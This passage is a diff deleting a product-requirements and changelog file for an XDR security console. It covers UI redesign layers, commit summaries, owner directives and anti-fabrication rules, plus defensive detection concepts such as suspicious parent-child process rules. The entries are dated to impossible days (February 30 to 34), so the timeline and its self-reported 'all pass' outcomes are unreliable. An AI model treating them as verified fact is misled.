-Global product-wide design-system pass — the entire `/xdr/*`
-surface now reads as one cohesive enterprise SOC product.  Live in
-production at `https://nivxray-xdr.vercel.app/xdr/*`.
-
-Commit `562a4c3` — 2 files, +196 / -205:
-
-**Design tokens (`xdr-console.css` root)**
-- Deep navy-slate navigation surface (topbar + sidebar) —
-  `#0F172A` / `#111827` with slate-800 borders.  Premium, confident;
-  replaces the flat matte-black shell.
-- Warm neutral workspace surface (`#FAFAF9` → `#F5F5F4`) with pure
-  white card layer.  Not clinical white; not gray-on-gray.
-- Refined NivXRay purple identity (`#6D4EE0`) with hover, focus
-  ring, dim variants.
-- Restrained teal secondary accent for supporting data.
-- Full semantic status system (success · info · warn · danger ·
-  critical) with matched bg / border tokens.
-- 3-tier elevation shadows.
-- Enterprise typography scale + antialiased rendering.
-- Every downstream page (MSS Dashboard, Rule Studio, Threat
-  Intelligence, MITRE Heatmap, Admin, Playbooks) consumes the same
-  tokens and re-themes automatically — no page-level edits needed.
-
-**Topbar refresh**
-- 50 px deep navy sticky header, refined search field with purple
-  focus ring, rounded purple tenant pill, 30 px purple avatar chip.
-
-**Sidebar refresh**
-- Deep navy `#0F172A` with slate-200 typography and slate-500
-  section headers.
-- Active state: purple 3 px left indicator + subtle purple wash
-  + white bold typography.  Disabled items at 55 % opacity.
-
-**XdrShell**
-- Retired the `.xdr-console--light` Layer 3 v2 escape hatch.  One
-  design system covers every route.
-
-**Contracts unchanged** — engine lock absolute, anti-fabrication
-preserved.
-
-6 production acceptance screenshots captured (queue · record ·
-MSS Dashboard · Rule Studio · MITRE Heatmap · Admin/Integrations).
-Every route reads as one cohesive commercial-quality enterprise XDR.
-
-Next sequence: Phase 3 Lifecycle/SLA policy engine → Phase 4
-Auto-Investigation provenance orchestration → per-page density
-refinements.
-
----
-
-## ✅ 2026-02-34 · Layer 3 v2 · SHIPPED (visual redesign)
-
-You called out that Layer 3 v1 was still visually the legacy
-NivXRay dark UI with Defender-shaped chrome bolted on top.  Layer
-3 v2 is a full **visual language redesign** — not another
-functionality pass.
-
-Live on production at
-`https://nivxray-xdr.vercel.app/xdr/incidents/:id`.
-
-Commit `877df28` — 10 files, +965 / -251:
-
-- **Global light chrome** (`xdr-console--light`): the topbar and
-  sidebar switch to white surfaces + charcoal typography whenever
-  the URL is under `/xdr/incidents`.  Other XDR pages keep their
-  legacy dark shell until they are individually redesigned.
-- **The dark analyst-canvas concept is deprecated** — every Layer 3
-  tab now renders inside the same light tab panel.
-- **Reused dark engine panels dropped from the record** —
-  `AttackChainPanel`, `ProcessTreePanel`, `XdrCompletenessPanel`,
-  `XdrRecommendationsPanel`, `ScenarioIntelligencePanel`,
-  `DomainCardsGrid` are no longer imported here.  They still exist
-  for other pages; the record now reads the same authoritative
-  data (`evidence_pointers`, `mitre`, `attack_progression`,
-  `summary`, `response-executions`) and renders it in native light
-  components.
-- **New light-first tabs**:
-  - **EvidenceTab**: six light domain cards (Endpoint · Identity ·
-    Files · Network · Email · Cloud) with semantic status pills
-    (RELATED · SEARCHED · NO EVIDENCE · NOT CONNECTED), detection
-    counts and honest reason text.
-  - **MitreTab**: metric header (Tactics · Techniques · Confidence)
-    plus one light card per observed tactic, ordered by KILL_CHAIN,
-    each with a tactic → technique → confidence row.
-  - **AttackStoryTab**: light vertical timeline with tactic-coloured
-    event dots and technique badges derived from
-    `attack_progression`.
-  - **RecommendationsTab**: light priority-coded recommendation list
-    (CRIT / HIGH / MED / LOW) built from evidence gaps + response
-    executions, plus a response-execution table.
-  - **AutoInvestigationTab**: light status card with a circular
-    NOT_RUN / COMPLETE / PARTIAL / FAILED / RUNNING badge and
-    Phase-4 provenance placeholder.
-- **Anti-fabrication contract preserved** everywhere — NOT_RUN ·
-  NO EVIDENCE · NOT AVAILABLE · UNKNOWN · em-dash.
-- **Engine lock still absolute** — zero backend changes.
-
-5 production acceptance screenshots captured (queue · Evidence ·
-MITRE · Recommendations · Auto-Investigation).  All match the
-Defender/SIR quality bar.
-
-Next sequence: Phase 3 Lifecycle/SLA policy engine → Phase 4
-Auto-Investigation provenance orchestration.
-
----
-
-## ✅ 2026-02-33 · Layer 3 · SHIPPED
-
-Layer 3 (Incident Record product-quality rebuild) is **complete and
-live on production** at
-`https://nivxray-xdr.vercel.app/xdr/incidents/:id`.
-
-Delivered in a single commit (`327f79b`) — 14 files, +1 920 / -697:
-
-- Hybrid theme: light Defender-parity workspace for the header ·
-  lifecycle · executive / technical / evidence / notes / timeline /
-  related / closure surfaces + a scoped **dark analyst canvas** for
-  the deep engine panels (MITRE trajectory · Attack Story process
-  tree · Completeness · Recommendations · Auto-Investigation
-  status).  Reuses the Layer 2 chip primitives.
-- **RecordHeader**: breadcrumb → identity strip → Priority/Severity/
-  Verdict/State chips (+ High-Fidelity / Customer-Engaged when set)
-  → 8-cell meta grid (Confidence · Risk · Owner · Customer ·
-  Detection · SLA Due · Aging · Techniques) → Respond / Generate
-  Report / More actions.
-- **LifecycleStrip**: Defender-parity stepper driven by
-  `LIFECYCLE_TRANSITIONS` map, invokes the existing
-  `PATCH /api/incidents/:id/state` endpoint.
-- **RecordTabs**: 11 URL-persisted tabs — Executive · Technical ·
-  Evidence · Auto-Investigation · MITRE · Attack Story ·
-  Recommendations · Notes · Timeline · Related · Closure.
-- **Executive / Technical / Evidence / Notes / Timeline / Related /
-  Closure**: light-workspace panels rendering canonical data from
-  `/api/incidents/:id` + `/api/incidents/:id/summary` +
-  `/api/activity/inventory` with the honest four-state semantics
-  (OK · NO MATCHING EVIDENCE · NOT CONNECTED · NOT AVAILABLE ·
-  ERROR).
-- **MITRE / Attack Story / Recommendations / Auto-Investigation**:
-  dark analyst canvas that reuses the existing engine panels
-  (`AttackChainPanel`, `ProcessTreePanel`,
-  `ScenarioIntelligencePanel`, `XdrCompletenessPanel`,
-  `XdrRecommendationsPanel`) unmodified.
-- **Closure**: disposition + root-cause selectors + mandatory
-  note + Mark Resolved / Close Incident actions that invoke the
-  existing state transition endpoint.  Structured closure fields
-  are packaged into the transition note today; Phase 3 will
-  promote them to real columns.
-- **Anti-fabrication kept honest** — NOT_RUN · NO EVIDENCE ·
-  NOT AVAILABLE · UNKNOWN · em-dash everywhere.
-
-**Engine lock respected** — zero backend changes; every deep
-investigation surface is reused as-is.
-
-4 production acceptance screenshots captured (Executive · Evidence ·
-Auto-Investigation dark canvas · Notes).  All pass.
-
-Next sequence: Phase 3 Lifecycle/SLA policy engine → Phase 4
-Auto-Investigation provenance orchestration.  Queue Row Density
-Toggle stays in the Layer-2 backlog.
-
----
-
-## ✅ 2026-02-33 · Layer 2 · SHIPPED
-
-Layer 2 (Incident Queue product-quality rebuild) is **complete and
-live on production** at `https://nivxray-xdr.vercel.app/xdr/incidents`.
-
-Delivered in a single commit (`2635401`) — 9 files, +2 484 / -436:
-
-- Hybrid theme: Defender-parity **light analyst workspace** +
-  **dark investigation preview drawer** + NivXRay purple accent.
-- 6 reusable chip families in `src/xdr/components/chips/`
-  (Priority · Severity · Verdict · State · Side-state · Domain) —
-  reused later in Layer 3.
-- 8-tile **PriorityStrip** (Critical · High · Unassigned · My Queue ·
-  SLA Risk · On Hold · New · Updated) driven by `/api/xdr/mss/kpis`.
-- **QueueToolbar**: search · Filters button · Saved Views dropdown
-  (apply / delete / save-current) · Customize Columns (drag-reorder
-  + toggle + reset) · 7 d time selector · CSV export (client-side,
-  10 000-row cap) · Refresh.
-- **FiltersPanel** side sheet: priority · severity · verdict ·
-  confidence · customer · detection source · MITRE technique.
-- **StateTabs**: All · New · In Progress · On Hold · Resolved ·
-  Closed with live counts, URL-persisted (`?state=`).
-- **QueueTable**: sticky-header dense table · 10 default cols +
-  5 hideable · sortable · multi-select · keyboard-friendly.
-- **IncidentPreviewDrawer**: right-side dark drawer · chips ·
-  Key Facts KV · Auto-Investigation status metrics · Evidence &
-  Techniques metrics · Executive Summary excerpt (only when
-  provided) · up/down/Escape nav · Open Investigation CTA.
-- Column visibility + order persisted in `localStorage`.
-- All missing data preserved as **NOT_RUN · NO EVIDENCE ·
-  NOT AVAILABLE · UNKNOWN · —**.  Anti-fabrication intact.
-
-**Engine lock respected** — zero changes to backend engines/APIs.
-
-6 acceptance screenshots captured on Vercel (full queue · KPI + toolbar ·
-Customize dropdown · filtered queue with active chip · preview drawer ·
-bulk selection state).  All pass.
-
-Next work items are Layer 3 (Incident Record) and Phase 3
-(Lifecycle / SLA), preserving the same chip primitives and
-anti-fabrication contract.
-
----
-
-## 🛑 2026-02-32 · READ THIS FIRST — Layer 2 Final Execution Contract
-
-The owner has issued the **final** Layer 2 execution contract.  Read
-it before doing anything else:
-
-**`/app/memory/LAYER2_FINAL_EXECUTION_CONTRACT.md`**
-
-Key rule: **Do not ask** the owner to choose theme, colours, layout,
-columns, chip styles, spacing, buttons, or any other cosmetic/UX
-decision.  Design authority is delegated to the executing agent.
-
-Study → Design → Implement → Verify → Ship.  The deployed UI plus
-6 acceptance screenshots are the completion gate.  `yarn build`
-passing is not acceptance.
-
-
-
----
-
-## ⚡ 2026-02-32 · Execution authority granted · next-session directive
-
-Owner has explicitly delegated Layer 2 design authority to the executing agent:
-
-> **Execute Layer 2 now.  Do not ask multiple questions.**  Do not ask
-> the owner to choose between light/dark themes, column selection,
-> chip styles, layout options, spacing, typography, etc.  Study the
-> five references (Defender Queue / Manage / Investigate + ServiceNow
-> SIR Workspace / New UI), implement the strongest solution, verify
-> it, ship it.
-
-The next session must **not** open with `ask_human` for preference
-questions.  Read `/app/memory/LAYER2_QUEUE_REBUILD_MANDATE.md` and
-execute end-to-end.  Ask only if a truly blocking ambiguity arises —
-never for cosmetic / design choices.
-
-
-
----
-
-## 🔒 2026-02-32 · LAYER 2 · AUTHORIZED · EXECUTE NEXT SESSION
-
-Owner has explicitly authorized Layer 2 execution as a **product-quality
-rebuild**, not an incremental patch.  The authoritative brief is:
-
-**`/app/memory/LAYER2_QUEUE_REBUILD_MANDATE.md`**
-
-Non-negotiable rules attached to this authorization:
-
-1. **No engine changes.**  IDA · IUE · UAIE · VEEE · DIE · ICE · IEDDE ·
-   UIL · Interpreter · Recipe · Recursive · Artifact Intelligence · PE ·
-   Behavioral · Fingerprint · Technique · IOC Intelligence · CEM ·
-   Provenance · SSOT · KB · MITRE · LOLBAS · Sigma · TI · OSINT ·
-   Evidence-Driven Mitigation · 43 UAIE plugins — untouched.
-2. **Theme lock lifted.**  Do not preserve the current all-dark UI just
-   because it exists.  Choose the theme (light · dark · hybrid) that
-   gives an SOC analyst the best readability, density and hierarchy.
-   Provide Light / Dark / System theme support where it improves
-   analyst ergonomics.
-
-   **2026-02-32 clarification** — full visual-system unlock: derive
-   colour · surfaces · typography · spacing · cards · borders ·
-   buttons · dropdowns · filters · chips · tables · tabs · toolbars ·
-   side panes · hover/selected/active states · empty states ·
-   information hierarchy · responsive behaviour from Defender + SIR
-   references.  Do not inherit the current dark theme by default.
-   This is a **design decision**, not an inherited constraint.
-   Think like a product designer + SOC architect.
-3. **Reference UX benchmarks** (never clone):
-   - Microsoft Defender XDR — Incident Queue · Manage · Investigate
-   - ServiceNow SIR — Workspace Landing · New UI
-4. **Rebuild `/xdr/incidents` from scratch** around existing data /
-   APIs / contracts.  All existing filter · lens · saved-view · bulk ·
-   audit · evidence-immutability · engine-status-projection ·
-   anti-fabrication invariants preserved.
-5. **6 component families** shipped as reusable primitives in
-   `xdr/components/chips/`: Priority · Severity · Verdict · State ·
-   Side-State · Domain tag.
-6. **12 layout components** shipped: priority strip · toolbar ·
-   state-tab strip · time selector · filter chip row · sticky header ·
-   multi-select · bulk-action toolbar · Customize Columns · preview
-   drawer · CSV export · responsive horizontal scroll.
-7. **Default visible columns cut to 10**; 5 hidden behind Customize
-   Columns.
-8. **Anti-fabrication contract** verbatim:  no evidence → `NO EVIDENCE`
-   · no enrichment → `NOT AVAILABLE` · no engine execution → `NOT RUN`
-   · no MITRE → `—` · no SLA → `—` · no verdict → `UNKNOWN` · engine
-   failed → `FAILED`.
-9. **Acceptance** requires 6 verified screenshots on the deployed URL:
-   full queue · KPI strip + toolbar · Customize Columns open · filtered
-   queue · preview drawer · bulk-selection state.  `yarn build`
-   passing is **not** acceptance on its own.
-10. **`/xdr/incidents` stays the primary analyst landing page.**
-    **`/xdr/mss-dashboard` stays the separate SOC/MSS Command Center.**
-
-### Locked queue after Layer 1
-
-```
-Phase 0 ✅  Architecture Audit
-Phase 1 ✅  Analyst Operations Dashboard (superseded/redirected)
-MSS Dashboard ✅
-Phase 2 ✅  Investigation-Aware Queue (v1 · 15-column functional baseline)
-Layer 1 ✅  Queue-first IA
-Layer 2 🎯  Product-quality Queue Rebuild ← NEXT SESSION
-Layer 3      Incident Record Redesign (chip components reusable from Layer 2)
-Phase 3      Lifecycle + SLA policy engine
-Phase 4      Auto-Investigation Orchestration (xdr_observations · engine_executions)
-Phase 5      Investigation Surface (Exec · Technical · Evidence · Attack Story · MITRE · Recommendations)
-Phase 6      Enrichment (internal telemetry + TI + OSINT + artifact)
-Phase 7      Activity · Notes · Related Records · Attachments
-Phase 8      Response integration
-Phase 9      Resolution + Closure Readiness
-Phase 10     Final Auto-Investigation Report
-```
-
-### Memory files for the next session (read in this order)
-
-1. `/app/memory/LAYER2_QUEUE_REBUILD_MANDATE.md` — Layer 2 authoritative brief
-2. `/app/memory/ANALYST_OPERATIONS_MANDATE.md` — full 7-layer program + engine-fabric lock
-3. `/app/memory/ANALYST_OPERATIONS_ARCHITECTURE.md` — Phase 0 engine inventory
-4. `/app/memory/PHASE4_ORCHESTRATION_SPEC.md` — Phase 4 contracts
-5. `/app/memory/PRD.md` — this file (locked phase order · task-B completion)
-
-
-
----
-
-## 🔒 2026-02-31 · SUPERSEDING ARCHITECTURE — NivXRay Analyst Operations
-
-**Locked by owner directive on 2026-02-31.**  The previous
-`B → E → C → A → F → D` queue is **superseded** by a new pillar:
-**NivXRay Analyst Operations** — the operational nervous system around
-the existing NivXRay investigation brain.
-
-### Non-negotiable principles
-
-1. Analyst Operations is a NEW pillar that **orchestrates and presents**
-   the existing engine fabric.  It **does not** re-implement any engine.
-2. Engines that remain first-class reusable services (never removed,
-   never simplified, never replaced by LLM output):
-   * **Investigation** — IDA · IUE · UAIE · VEEE · DIE · ICE
-   * **Decoding / Command** — IEDDE · UIL · Interpreter Identifier ·
-     Recipe Planner · Recursive Child Pipeline
-   * **Artifact / Malware** — Artifact Intelligence · PE Analyzer ·
-     Behavioral · Attack Fingerprint · Technique Detector · IOC
-     Intelligence
-   * **Governance** — CEM · Confidence & Provenance · SSOT
-   * **Knowledge** — KB · MITRE · LOLBAS · Sigma · Threat Intelligence ·
-     OSINT · Evidence-Driven Mitigation · SOC-100
-3. Retirement of an analyst-facing panel is **not** removal of the
-   underlying engine (IUE/UAIE/VEEE remain intact).
-4. Anti-fabrication invariants preserved on every layer:
-   * Scenario knowledge ≠ Incident evidence ≠ Detection ≠ Verdict
-   * Recommendation ≠ Executed action
-   * System-generated ≠ Analyst-authored
-   * Missing engine result is honest, not fabricated
-
-### Locked phase order (replaces B → E → C → A → F → D)
-
-| Phase | Deliverable |
-|-------|-------------|
-| **0** | Architecture Audit (`/app/memory/ANALYST_OPERATIONS_ARCHITECTURE.md`) — **DONE** |
-| **1** | Operations Dashboard (routed) with real lens tiles: Critical · High Priority · High Fidelity · Unassigned · In Progress (mine) · Customer Response · On Hold · Aging · Recently Created · Recently Updated |
-| **2** | Incident Queues — operational lenses + filters (state / severity / priority / customer / assignee / detection source / technique / verdict / created / updated) |
-| **3** | Incident Record + Lifecycle + Ownership (`new / triaged / investigating / containment / eradication / recovery / resolved / closed / canceled` + side-states `on-hold / waiting-customer / waiting-evidence / waiting-vendor`) |
-| **4** | Auto-Investigation Orchestration — wires IDA→IUE→UAIE→DIE→VEEE→ICE→Verdict + Process Genealogy (was Task E) + Correlation into a per-incident engine-execution ledger; emits canonical OBSERVATION rows into `xdr_observations` |
-| **5** | Executive Summary · Technical Summary · Supporting Evidence · Recommendations (evidence-referenced, generated ↔ analyst-annotated) |
-| **6** | Enrichment (IP / Domain / URL / Hash / File / Process / User / Host / Certificate) + Telemetry navigation + OSINT + TI |
-| **7** | Activity · Notes · Related Records · Attachments |
-| **8** | Response integration (isolate / quarantine / block / disable / collect / terminate / net-contain) with immutable execution telemetry |
-| **9** | Closure + Closure Readiness (Root Cause / Cause Category / Threat Stage / Responsible Party / Resolution / Customer Confirmation / Closure Evidence) |
-| **10** | Final evidence-backed Report |
-
-### Task B status
-
-* **B · SOC-100 Scenario Intelligence — DONE (2026-02-30).**
-  * `soc100_scenarios.json` = 100/100 scenarios with full playbook
-    schema (`investigation_objective`, 13-step `investigation_steps`,
-    `decision_evidence.{malicious,benign,contained}`, `containment`,
-    `escalation`, `closure`, `detection_improvement`, `pivots`,
-    `attack_techniques`, `source_page`).
-  * 68 unique ATT&CK techniques, categories aligned with PDF section
-    boundaries: phishing 12 · malware 12 · credential 12 · vpn 8 ·
-    dns 8 · powershell 10 · ransomware 12 · cloud 10 · insider 8 ·
-    web 8.
-  * Router `routers/xdr_scenarios.py` returns extended playbook fields
-    on match (`investigation_objective`, `investigation_steps`,
-    `decision_evidence`, `containment`, `escalation`, `closure`,
-    `detection_improvement`).  Deterministic ordering:
-    `sort by (-match_score, scenario_number)`.
-  * Pytest `tests/test_xdr_scenarios.py` — **24 tests green** covering:
-    corpus load, exactly-100, sequential 1..100, unique IDs, required
-    fields, valid categories, well-formed ATT&CK ids, ≥1 technique
-    per scenario, full playbook schema, deterministic match / score /
-    ranking / pivots, PowerShell-technique match, missing-incident
-    404, ranking-by-score, empty-incident zero matches, empty-incident
-    zero observed telemetry, no verdict-shaped keys leaked, no
-    incident evidence mutation, no observation writes to any
-    canonical collection, missing-techniques never labelled observed,
-    invariant string surfaced.
-  * All anti-fabrication invariants enforced.
-
-### Task E (was P0) — now folded into **Phase 4**
-
-The server-side Process Genealogy engine that was Task E is now the
-mandatory deliverable of **Phase 4 · Auto-Investigation Orchestration**.
-It will emit canonical OBSERVATION rows into `xdr_observations` and
-feed the correlation engine — same requirement, correct architectural
-home.
-
-### Reference documents
-
-* `/app/memory/ANALYST_OPERATIONS_ARCHITECTURE.md` — full engine
-  inventory, API contract map, ENGINE → INPUT → OUTPUT → CONSUMER
-  diagram, frontend surface map, gap analysis, locked phase order.
-* `/app/backend/data/soc100_scenarios.json` — 100/100 SOC scenarios.
-* `/app/backend/tests/test_xdr_scenarios.py` — anti-fabrication +
-  determinism regression suite (24 tests).
-
-
-
-## ✅ 2026-02-30 · B (SOC-100 shell) + Report tab shell + Q1·C adopter cleanup — SHIPPED
-
-* **B · SOC-100 Scenario Intelligence** — 20/100 scenarios in the
-  compact corpus at `/app/backend/data/soc100_scenarios.json`.
-  Backend router `routers/xdr_scenarios.py` exposes
-  `GET /api/xdr/scenarios`, `GET /api/xdr/scenarios/{id}` and
-  `POST /api/xdr/investigation/{id}/scenario-match` with
-  deterministic scoring (3 pts per matching technique + 1 pt per
-  keyword hit).  Frontend `ScenarioIntelligencePanel.jsx` mounted
-  in the Investigation tab and verified live on Vercel.  Guidance
-  only · never evidence · never verdict.  **Full-100 ingestion
-  queued as B follow-up.**
-* **Q2·ii · Report tab shell** — `InvestigationReportShell.jsx`
-  renders Executive Summary + Coverage (8 facets) + Sections
-  availability list.  Generate PDF disabled — shell NEVER
-  fabricates content.  Full engine deferred to F.
-* **Q1·C · Adopter cleanup** — retired `XdrVerdictPanel`,
-  legacy `XdrInvestigationReportPanel`, `XdrIueTimelinePanel`,
-  `XdrUaieCatalogPanel`.  Kept DIE, IEDDE, UIL as reused NivXRay
-  Tool intelligence.
-* Bundle: `XdrIncidentDetailPage` 107.65 → 113.89 kB.
-  Pushed as `178bd29`.  Zero page errors on live verify.
-
----
-
-## 🔒 2026-02-30 · NivXRay XDR Investigation Architecture — LOCKED
-
-**Execution queue (locked · non-negotiable):**
-
-| Priority | Work                                    | Why                                                       |
-|----------|-----------------------------------------|-----------------------------------------------------------|
-| 🔴 P0    | **B · SOC-100 Scenario Intelligence**   | Investigation guidance foundation                        |
-| 🔴 P0    | **E · Process Genealogy (server-side)** | Canonical behavioral observations                        |
-| 🔴 P0    | **C · Attack Story Panel**              | Human-readable evidence-backed explanation               |
-| 🔴 P0    | **A · Selection Sync**                  | Makes all investigation projections one workspace        |
-| 🟠 P1    | **F · Auto-Investigation Report**       | Consumes the completed investigation model               |
-| 🟡 P1    | **D · Rule Studio Visual Builder**      | Detection authoring UX (does not block investigation)    |
-
-**Rules that apply to every step:**
-* Do **not** create parallel Process Tree, Behavior, ATT&CK Chain or
-  Attack Story engines.  Reuse existing NivXRay Tool intelligence /
-  behavior capabilities wherever equivalent functionality exists.
-* SOC-100 is investigation **guidance only** — never detection, never
-  evidence-state, never verdict.
-* Process Genealogy produces **OBSERVATION** objects only — never
-  verdicts.
-* All three projections consume the canonical evidence/behavior model.
-* Preserve evidence traceability + anti-fabrication invariants at
-  every stage.
-* Do not expand scope until each stage passes its acceptance gate.
-
----
-
-## 🔒 2026-02-30 · NivXRay XDR Investigation Architecture — LOCKED
-
-Owner directive (verbatim intent — non-negotiable):
-
-**One canonical model, three projections.  Never three engines.**
-
-```
-                 CANONICAL EVIDENCE
-                        │
-                        ▼
-              NivXRay Behavior Model
-                        │
-          ┌─────────────┼─────────────┐
-          ▼             ▼             ▼
-    Process Tree    ATT&CK Chain   Attack Story
-          │             │             │
-          └─────────────┼─────────────┘
-                        ▼
-                 Evidence Graph
-                        │
-                  IKG → ICE
-                        │
-                     VERDICT
-                        │
-                     INCIDENT
-                        │
-             Auto-Investigation Report
-```
-
-* Process Tree, ATT&CK Chain and Attack Story are **projections** of
-  the same canonical evidence.  They MUST remain cross-linked.
-* Selection sync (`WorkspaceSelectionContext`) is a hard requirement:
-  clicking a process must highlight the matching ATT&CK technique,
-  Evidence Trajectory node, network/IOC/detection rows, raw event and
-  Attack Story sentence.
-* Every ATT&CK Chain arrow must carry a relationship kind:
-  `OBSERVED · SEQUENCED · CORRELATED · INFERRED`.
-* Attack Story must be evidence-referenced sentence-by-sentence;
-  never a "Threat Score 8.8"-style opaque narrative.
-
-### SOC-100 Scenario Corpus · Scenario Intelligence layer
-
-```
-                 SOC-100 Scenario Corpus
-                         │
-              Scenario Intelligence
-                         │
-       ┌─────────────────┼──────────────────┐
-       ↓                 ↓                  ↓
- Recommended        Investigation       Validation /
- Pivots             Workflow             Regression
-```
-
-* Scenarios drive **investigation guidance**, NOT detection, NOT
-  evidence-state, NOT verdicts.
-* NivXRay says:  *"Scenario match: Suspicious Office child process ·
-  Why: WINWORD → PowerShell observed · Recommended pivots: command
-  line → parent process → file provenance → hash → network →
-  persistence · Evidence still missing: network activity · Next best
-  investigation action: inspect PowerShell network connections."*
-* NivXRay does NOT say: *"Scenario matched therefore malicious."*
-* Ingest the PDF as structured knowledge per scenario: name, threat,
-  initial observable, required telemetry, pivots, process
-  relationships, IOC types, ATT&CK techniques, expected evidence,
-  investigation sequence, false-positive considerations, next-step
-  recommendation.
-
-### Anti-fabrication rules (locked)
-
-```
-Scenario knowledge  ≠  Incident evidence  ≠  Verdict
-```
-
-* PDF says "LSASS access should be investigated"; incident has zero
-  LSASS evidence → **NOT OBSERVED** (never "SUSPICIOUS", never
-  fabricated).
-* Techniques with zero evidence are never rendered.
-* Unknown parents remain unknown ("unknown parent" root).
-* Missing tactic stages remain missing — listed in the honest-gaps
-  surface, never inferred to complete the chain.
-
-### Correction to earlier PRD wording
-
-The previous section said "6-state evidence-state badges from the
-SOC-100-scenarios PDF".  This is a misstatement.  The correct
-statement:
-
-* The 6 canonical evidence states (`CAPABILITY · ATTEMPTED ·
-  OBSERVED · EXECUTED · CORRELATED · CONFIRMED_IMPACT`) are derived
-  from **actual telemetry-backed evidence** at investigation time.
-* The SOC-100 corpus defines *scenario state expectations* (what
-  should be looked for), never the observed state on any real
-  incident.
-
----
-
-## ✅ 2026-02-30 · Investigation · Process Tree graph visual + UnIsolate + Trajectory operational
-
-**Owner directive** (verified live on `nivxray-xdr.vercel.app`):
-* **Adopt NivXRay Tool intelligence** into the XDR Investigation surface — don't rebuild.
-* **100% real mapping** — no fabrication, no missing, no quality
-  compromise.  Absence of evidence remains absence.
-* **Semantic invariants** (SOC-100-scenarios PDF corpus):
-  `CAPABILITY · ATTEMPTED · OBSERVED · EXECUTED · CORRELATED ·
-  CONFIRMED_IMPACT`.  Verdict Engine remains sole verdict owner.
-
-**ATT&CK Trajectory (`AttackChainPanel.jsx`) — OPERATIONAL:**
-* Full 14 tactic swim-lanes ALWAYS rendered.
-* Technique nodes plotted temporally with bezier curves connecting
-  sequential techniques (temporal, NEVER causal — noted in help caption).
-* Data sources merged additively (NEVER mutating the incident):
-  1. `verdict_stage2.evidence[]` + `incident.evidence[]` via
-     `RULE_TO_TECHNIQUE[rule_id]` + direct `technique_id` (authoritative).
-  2. `incident.mitre[]` / `incident.techniques[]` / `incident.attack_techniques[]`
-     — string OR `{technique_id | id, timestamp, count}` objects.
-  3. `GET /api/incidents/{id}/summary` (base NivXRay-Tool authoritative
-     summary) — `suspicious_elements[].rule_id` → RULE_TO_TECHNIQUE.
-  4. `GET /api/xdr/correlation/matches?incident_id=` — flips per-technique
-     `CORRELATED` badge from the authoritative correlation engine.
-* 4 relationship badges per technique:
-  `OBSERVED · SEQUENCED · CORRELATED · INFERRED`.
-* Zoom `− · % · +`, RESET (auto-layout+pan+zoom), CLOSE.  Nodes are
-  draggable; canvas is pannable.  Technique metadata sourced from
-  canonical `TECHNIQUE_INDEX` (MITRE Enterprise v16, Oct 2024).
-* Techniques with 0 evidence are NEVER plotted — honest gap surface
-  lists untouched tactics ("13/14 tactics without evidence: …").
-* Live-verified on Vercel: `PrevMode` incident → `T1027 · Obfuscated
-  Files` renders in DEFENSE EVASION lane.  Zero page errors.
-
-**Process Tree (`ProcessTreePanel.jsx`) — graph visual:**
-* Replaced the indented-tree list with an SVG process-graph
-  matching NivXRay Tool's "PREDICTED PROCESS TREE" style:
-  rounded rectangles with process name + tactic + technique IDs;
-  curved bezier edges parent → child; deterministic BFS layout.
-* Per-node evidence-state badge strip · 6 canonical states
-  (`CAPABILITY · ATTEMPTED · OBSERVED · EXECUTED · CORRELATED ·
-  CONFIRMED_IMPACT`) derived from actual evidence, plus
-  `SUSPICIOUS` (rare parent-child OBSERVATION) and `DETECTED`
-  (rule fired).  NONE of these are verdicts.  The SOC-100 corpus
-  defines what to LOOK for, never what HAPPENED — the states above
-  come from real telemetry.
-* Consumes evidence rows AND direct `incident.processes[]` /
-  `incident.process_tree[]` arrays (flat or nested via children[]).
-* 6 rare parent-child rules (Office → script · Browser → shell ·
-  Service → shell · Web-server → shell · PowerShell → LOLBIN ·
-  LOLBIN → network) emit SUSPICIOUS OBSERVATION only.
-* Right-hand details pane: image · pid · ppid · guid · user · host
-  · command_line · sha256 · signer · signature · integrity ·
-  techniques · detections · evidence refs.
-* Unknown parents remain unknown — never fabricated.
-
-**Response Action Registry — UnIsolate Endpoint:**
-* Added `endpoint.unisolate` action (label "UnIsolate Endpoint")
-  next to `endpoint.isolate` — reversible, non-destructive, same
-  `responder:endpoint:isolate` permission.  Analyst Response
-  drawer picks it up automatically via `ACTIONS_BY_PROVIDER`.
-
-**Backlog captured from owner directive:**
-* SOC-100-Scenarios PDF → Scenario Corpus (first-class investigation
-  knowledge, not detection rules).  Validate Process Tree +
-  Genealogy against scenarios 013–024 and 053–062.
-* Server-side Process Genealogy & Behavioral Analytics engine.
-* Auto-Investigation Report consuming Trajectory + Process Tree.
-* Rule Studio Visual Condition Builder wiring (AST + recursive UI
-  already authored in `src/xdr/rule-studio/`).
-
----
-
-## ✅ 2026-02-30 · Investigation tab · KILL_CHAIN black-screen fix — SHIPPED
-
-**Owner directive (2026-02-30):** *"NivXRay XDR = NivXRay Tool + XDR
-Platform.  Do not create a separate XDR ATT&CK Chain implementation.
-Do not build a competing process tree.  Project the existing Tool
-capabilities into the XDR Investigation workspace using XDR-collected
-evidence.  Preserve evidence-to-node traceability.  Never fabricate."*
-
-**Delivered — two new first-class panels, zero new engines:**
-
-* **`ProcessTreePanel.jsx`** — mounted inside the Investigation tab
-  right below Evidence Trajectory.  Canonical Process Evidence
-  extracted from the SAME source Evidence Trajectory uses
-  (`verdict_stage2.evidence[]` + `incident.evidence[]`).  Optional
-  enrichment from `GET /api/edr/process-tree` treated as an adapter,
-  NEVER a competing tree.
-  * Expandable indented tree · process-details pane with tabs:
-    Overview · Command Line · Hash & Signer · Network · Detections ·
-    ATT&CK · Evidence.
-  * Search by pid / image / command / sha256.  "Only suspicious"
-    filter.
-  * **Behavioral analytics (MVP)** — 6 rare parent-child rules ship
-    at boot:  Office → script · Browser → unusual child · Service →
-    shell · Web server → shell · PowerShell → LOLBIN · LOLBIN →
-    network.  Every match emits an OBSERVATION badge (SUSPICIOUS),
-    NEVER a verdict.
-  * **Badges:** OBSERVED · DETECTED · CORRELATED · SUSPICIOUS.
-    Process behaviour is never coloured "malicious"; the Verdict
-    Engine remains authoritative.
-  * **Honest empty state:** unknown parents render as an "unknown
-    parent" root (Windows genealogy legitimately allows this).
-    Never fabricated.
-
-* **`AttackChainPanel.jsx`** — mounted between Evidence Trajectory and
-  Process Tree.  Ordered tactic → technique projection built from
-  the SAME evidence rows, mapped through the authoritative
-  `RULE_TO_TECHNIQUE` table.  Never derived from the verdict.
-  * FOUR relationship kinds surfaced per technique so the chain is
-    never a decorative attack story:
-    * `OBSERVED`     evidence directly supports the technique
-    * `SEQUENCED`    temporal ordering established from timestamps
-    * `CORRELATED`   participates in a correlation match (best-effort
-                     enrichment from `/api/xdr/correlation/matches`)
